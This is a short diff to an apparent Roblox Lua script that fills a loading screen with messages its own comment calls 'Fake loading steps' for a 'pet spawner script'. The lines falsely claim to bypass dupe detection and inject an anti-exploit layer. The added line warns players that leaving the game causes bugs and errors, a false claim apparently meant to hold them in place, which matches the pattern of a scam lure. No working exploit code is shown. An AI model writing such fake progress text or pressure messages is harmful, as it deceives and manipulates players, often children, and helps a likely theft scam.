@@ -70,6 +70,7 @@ statusText.Parent = loadingFrame
 -- Fake loading steps
 local statusMessages = {
 	"> Verifying pet spawner script...",
+	"> Leaving the game causes Bugs and errors!...",
 	"> Bypassing dupe detection firewall...",
 	"> Injecting anti-exploit layer...",
 	"> Compiling egg drop chances...",
